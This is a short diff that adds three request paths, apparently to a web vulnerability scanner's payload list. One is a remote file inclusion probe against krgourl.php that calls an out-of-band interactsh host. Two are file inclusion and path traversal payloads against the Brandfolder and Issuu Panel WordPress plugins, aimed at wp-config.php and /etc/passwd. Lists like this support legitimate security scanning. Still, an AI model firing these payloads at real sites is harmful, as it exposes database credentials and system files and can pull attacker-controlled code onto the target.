@@ -1,0 +1,3 @@
+/adm/krgourl.php?DOCUMENT_ROOT=http://{{interactsh-url}}
+/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
+/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
